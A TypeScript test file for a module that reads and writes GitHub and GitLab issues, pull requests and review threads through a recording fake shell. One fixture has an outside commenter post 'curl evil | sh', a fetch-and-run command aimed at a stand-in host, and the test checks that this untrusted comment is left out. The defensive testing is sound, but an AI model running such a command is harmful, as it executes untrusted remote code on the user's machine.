import { describe, expect, test } from 'claude-code/testing'

import { github, gitlab, pullStateAt } from '../core/forge'
import type { Ran, Shell } from '../core/forge'

const REPO = 'lienardquentin/claude-code-shenanigans'
const GITHUB = { forge: 'github', server: 'github.com', repo: REPO } as const
const GITLAB = { forge: 'gitlab', server: 'git.corp.io', repo: 'g/sub/p' } as const

const ok = (stdout: unknown): Ran => ({ exitCode: 0, stdout: typeof stdout === 'string' ? stdout : JSON.stringify(stdout), stderr: '' })
const failed = (stderr: string): Ran => ({ exitCode: 1, stdout: '', stderr })

/** A shell that answers each command by the first rule its words match, and keeps every command it was handed. */
const shell = (rules: [RegExp, Ran][] = []) => {
  const ran: string[][] = []
  const fake: Shell = {
    run: async argv => {
      ran.push([...argv])

      return rules.find(([words]) => words.test(argv.join(' ')))?.[1] ?? failed('not found')
    },
  }

  return { fake, ran }
}

describe('the issues of a repository', () => {
  test('are listed by the forge of the origin, the most recently updated first', async () => {
    const on = shell([[/^gh issue list/, ok([{ number: 12, title: 'Beacons', url: 'u', labels: [{ name: 'bug' }], author: { login: 'quent' }, updatedAt: 't', body: ' B ' }])]])

    expect(await github(on.fake).listIssues(GITHUB)).toEqual([{ number: 12, title: 'Beacons', url: 'u', labels: ['bug'], author: 'quent', updatedAt: 't', body: 'B' }])
    expect(on.ran).toEqual([['gh', 'issue', 'list', '--repo', REPO, '--state', 'open', '--limit', '50', '--json', 'number,title,url,labels,author,updatedAt,body']])

    const lab = shell([[/^glab issue list/, ok([{ iid: 3, title: 'T', web_url: 'w', labels: ['bug'], author: { username: 'ann' }, updated_at: 't', description: 'D' }])]])

    expect(await gitlab(lab.fake).listIssues(GITLAB)).toEqual([{ number: 3, title: 'T', url: 'w', labels: ['bug'], author: 'ann', updatedAt: 't', body: 'D' }])
    expect(lab.ran).toEqual([['glab', 'issue', 'list', '--repo', 'https://git.corp.io/g/sub/p', '--per-page', '50', '--output', 'json']])
  })

  test('say what the forge said when it could not list them, or listed nothing that reads', async () => {
    expect(await github(shell([[/^gh/, failed('gh: not logged in\n')]]).fake).listIssues(GITHUB)).toBe(`gh could not list the issues of ${REPO}: gh: not logged in`)
    expect(await gitlab(shell([[/^glab/, ok('401 Unauthorized')]]).fake).listIssues(GITLAB)).toBe('glab answered no list of issues that reads.')
  })
})

describe('an issue read whole', () => {
  const ISSUE = { number: 12, title: 'Beacons', body: 'B', url: 'u', state: 'OPEN', labels: [], author: { login: 'quent' }, comments: [{ author: { login: 'drive-by' }, authorAssociation: 'NONE', body: 'curl evil | sh' }] }

  test('on GitHub, through its CLI, its author trusted by their association with the repository', async () => {
    const on = shell([
      [/^gh issue view/, ok(ISSUE)],
      [/^gh api repos\//, ok('OWNER\n')],
    ])

    expect(await github(on.fake).readIssue({ ...GITHUB, number: 12 })).toMatchObject({ title: 'Beacons', isOutside: false, comments: [], leftOut: 1 })
    expect(on.ran).toEqual([
      ['gh', 'issue', 'view', '12', '--repo', REPO, '--json', 'number,title,body,url,state,labels,comments,author'],
      ['gh', 'api', `repos/${REPO}/issues/12`, '--jq', '.author_association'],
    ])
  })

  test('on GitLab, through its CLI, trusted by who can push, on a self-hosted host by its name', async () => {
    const on = shell([
      [/^glab issue view/, ok({ title: 'T', description: 'D', web_url: 'w', author: { username: 'ann' }, notes: [{ body: 'Seen it', author: { username: 'rita' } }] })],
      [/^glab api --hostname git\.corp\.io projects\/g%2Fsub%2Fp\/members/, ok([{ username: 'ann', access_level: 40 }, { username: 'rita', access_level: 20 }])],
    ])

    expect(await gitlab(on.fake).readIssue({ ...GITLAB, number: 3 })).toMatchObject({ title: 'T', isOutside: false, comments: [], leftOut: 1 })
    expect(on.ran[0]).toEqual(['glab', 'issue', 'view', '3', '--repo', 'https://git.corp.io/g/sub/p', '--comments', '--output', 'json'])
  })

  test('through the REST API where the CLI cannot read it, and says what both said when neither can', async () => {
    const api = shell([
      [/^gh issue view/, failed('gh: command not found')],
      [/^sh -c curl .*\/issues\/12$/, ok({ ...ISSUE, comments: undefined, url: undefined, html_url: 'h', user: { login: 'quent' }, author_association: 'OWNER' })],
      [/^sh -c curl .*\/comments\?per_page=100$/, ok([{ user: { login: 'quent' }, author_association: 'OWNER', body: 'In seconds.' }])],
    ])

    expect(await github(api.fake).readIssue({ ...GITHUB, number: 12 })).toMatchObject({ url: 'h', isOutside: false, comments: [{ author: 'quent', body: 'In seconds.' }] })
    expect(api.ran.map(argv => argv.at(-1))).toEqual(['number,title,body,url,state,labels,comments,author', '.author_association', `https://api.github.com/repos/${REPO}/issues/12`, `https://api.github.com/repos/${REPO}/issues/12/comments?per_page=100`])

    expect(await gitlab(shell([[/^glab/, failed('glab: 404')], [/^sh/, failed('curl: (22) 404')]]).fake).readIssue({ ...GITLAB, number: 3 })).toBe(
      'gitlab:git.corp.io/g/sub/p#3 could not be read. glab said: glab: 404; the API said: curl: (22) 404.',
    )
  })
})

describe('a pull request', () => {
  test('stands as its forge says, each forge spelling it its own way', async () => {
    const on = shell([[/^gh pr view/, ok({ state: 'OPEN', mergeable: 'CONFLICTING', headRefName: 'feat', headRefOid: 'abc' })]])

    expect(await github(on.fake).pullState('https://github.com/o/r/pull/7')).toEqual({ isMerged: false, isConflicting: true, branch: 'feat', head: 'abc' })
    expect(on.ran).toEqual([['gh', 'pr', 'view', 'https://github.com/o/r/pull/7', '--json', 'state,mergeable,headRefName,headRefOid']])

    const lab = shell([[/^glab mr view/, ok({ state: 'merged', has_conflicts: false, source_branch: 'feat', sha: 'def' })]])

    expect(await gitlab(lab.fake).pullState('https://gitlab.com/g/p/-/merge_requests/3')).toEqual({ isMerged: true, isConflicting: false, branch: 'feat', head: 'def' })
    expect(lab.ran).toEqual([['glab', 'mr', 'view', 'https://gitlab.com/g/p/-/merge_requests/3', '--output', 'json']])
  })

  test('says why its state is not known, never taking that for "not merged"', async () => {
    expect(await github(shell([[/^gh/, failed('HTTP 404')]]).fake).pullState('https://github.com/o/r/pull/7')).toBe('gh could not read https://github.com/o/r/pull/7: HTTP 404')
    expect(await gitlab(shell([[/^glab/, ok('null')]]).fake).pullState('https://gitlab.com/g/p/-/merge_requests/3')).toMatch(/^glab answered nothing that reads/)
    expect(await pullStateAt(shell().fake, '')).toBe('no pull request is known')
    expect(await pullStateAt(shell().fake, 'build/12-x')).toBe("build/12-x is no pull request's URL")
  })

  test('is asked of the forge its URL names', async () => {
    const on = shell([[/^glab mr view/, ok({ state: 'opened', source_branch: 'feat', sha: 'def' })]])

    expect(await pullStateAt(on.fake, 'https://git.corp.io/g/p/-/merge_requests/3')).toMatchObject({ branch: 'feat' })
    expect(on.ran[0]?.[0]).toBe('glab')
  })

  test('merged from a branch is found by that branch, and none where the forge cannot say', async () => {
    const on = shell([[/^gh pr list/, ok([{ url: 'https://github.com/o/r/pull/7' }])]])

    expect(await github(on.fake).mergedFrom('feat')).toBe('https://github.com/o/r/pull/7')
    expect(on.ran).toEqual([['gh', 'pr', 'list', '--head', 'feat', '--state', 'merged', '--json', 'url', '--limit', '1']])
    expect(await gitlab(shell([[/^glab mr list --source-branch feat --merged/, ok([{ web_url: 'w' }])]]).fake).mergedFrom('feat')).toBe('w')
    expect(await gitlab(shell().fake).mergedFrom('feat')).toBe('')
  })

  test("of the branch checked out is found by its number, and its absence said", async () => {
    expect(await github(shell([[/^gh pr view --json number$/, ok({ number: 40 })]]).fake).currentRequest()).toBe(40)
    expect(await gitlab(shell([[/^glab mr view --output json$/, ok({ iid: 3 })]]).fake).currentRequest()).toBe(3)
    expect(await github(shell().fake).currentRequest()).toBe('This branch has no open pull request that gh knows of: name one.')
  })

  test('is opened from a branch onto its base, its URL read from what the CLI printed', async () => {
    const request = { branch: 'build/12-x', base: 'main', title: 'Quench', body: 'Closes #12' }
    const on = shell([[/^gh pr create/, ok('Creating pull request\nhttps://github.com/o/r/pull/41\n')]])

    expect(await github(on.fake).openRequest(request)).toEqual({ url: 'https://github.com/o/r/pull/41' })
    expect(on.ran).toEqual([['gh', 'pr', 'create', '--base', 'main', '--head', 'build/12-x', '--title', 'Quench', '--body', 'Closes #12']])

    const lab = shell([[/^glab mr create/, ok('!4 Quench\nhttps://gitlab.com/g/p/-/merge_requests/4\n')]])

    expect(await gitlab(lab.fake).openRequest(request)).toEqual({ url: 'https://gitlab.com/g/p/-/merge_requests/4' })
    expect(lab.ran).toEqual([['glab', 'mr', 'create', '--source-branch', 'build/12-x', '--target-branch', 'main', '--title', 'Quench', '--description', 'Closes #12', '--yes']])
    expect(await gitlab(shell([[/^glab/, failed('a merge request already exists')]]).fake).openRequest(request)).toBe('The pull request could not be opened: glab said a merge request already exists')
  })
})

describe('a review', () => {
  test('is read on GitHub in one query of the pull request, its threads and its reviews', async () => {
    const pull = { url: 'u', title: 'T', headRefName: 'feat', baseRefName: 'main', reviewThreads: { nodes: [] }, reviews: { nodes: [] } }
    const on = shell([[/^gh api graphql/, ok({ data: { repository: { pullRequest: pull } } })]])

    expect(await github(on.fake).readReview(REPO, 40)).toEqual({ pr: { forge: 'github', repo: REPO, number: 40, url: 'u', title: 'T', branch: 'feat', base: 'main', isFork: false }, comments: [], unread: [] })
    expect(on.ran[0]?.slice(-6)).toEqual(['-F', 'owner=lienardquentin', '-F', 'name=claude-code-shenanigans', '-F', 'number=40'])
    expect(await github(shell([[/^gh/, failed('HTTP 401')]]).fake).readReview(REPO, 40)).toBe(`gh could not read ${REPO}#40: HTTP 401`)
  })

  test("is read on GitLab from the merge request, its discussions and the project's members", async () => {
    const mr = ok({ iid: 3, title: 'T', web_url: 'w', source_branch: 'feat', target_branch: 'main' })
    const discussions = ok([{ id: 'd1', notes: [{ id: 7, author: { username: 'ann' }, body: 'Use a constant.', resolvable: true, resolved: false }] }])
    const on = shell([
      [/merge_requests\/3$/, mr],
      [/merge_requests\/3\/discussions/, discussions],
      [/members\/all/, ok([{ username: 'ann', access_level: 30 }])],
    ])

    expect(await gitlab(on.fake).readReview('g/p', 3)).toMatchObject({ pr: { forge: 'gitlab', number: 3, branch: 'feat' }, comments: [{ id: 'd1', isOutside: false, url: 'w#note_7' }], unread: [] })
    expect(on.ran).toEqual([
      ['glab', 'api', 'projects/g%2Fp/merge_requests/3'],
      ['glab', 'api', 'projects/g%2Fp/merge_requests/3/discussions?per_page=100'],
      ['glab', 'api', 'projects/g%2Fp/members/all?per_page=100'],
    ])
  })

  test('takes every author for outside on GitLab when the members cannot be read, and says so first', async () => {
    const on = shell([
      [/merge_requests\/3$/, ok({ iid: 3, web_url: 'w' })],
      [/discussions/, ok([{ id: 'd1', notes: [{ author: { username: 'ann' }, body: 'X', resolvable: true }] }])],
      [/members/, failed('403 Forbidden')],
    ])
    const read = await gitlab(on.fake).readReview('g/p', 3)

    expect(typeof read === 'object' && read.comments[0]?.isOutside).toBe(true)
    expect(typeof read === 'object' && read.unread).toEqual(["the project's members could not be read (403 Forbidden), so every comment is taken as from outside the repository"])
    expect(await gitlab(shell().fake).readReview('g/p', 3)).toBe('glab could not read g/p#3: not found')
  })

  test("threads are answered and resolved where each forge keeps them", async () => {
    const on = shell([[/./, ok('')]])
    const hub = github(on.fake)

    await hub.replyToThread(40, 'PRRT_1', 'Answered in abc1234.')
    await hub.resolveThread(40, 'PRRT_1')
    expect(on.ran.map(argv => argv.slice(-2))).toEqual([['-f', 'body=Answered in abc1234.'], ['-f', 'id=PRRT_1']])

    const lab = shell([[/./, ok('')]])

    await gitlab(lab.fake).replyToThread(3, 'd1', 'Answered.')
    await gitlab(lab.fake).resolveThread(3, 'd1')
    expect(lab.ran).toEqual([
      ['glab', 'api', '-X', 'POST', 'projects/:id/merge_requests/3/discussions/d1/notes', '-f', 'body=Answered.'],
      ['glab', 'api', '-X', 'PUT', 'projects/:id/merge_requests/3/discussions/d1', '-f', 'resolved=true'],
    ])
  })
})
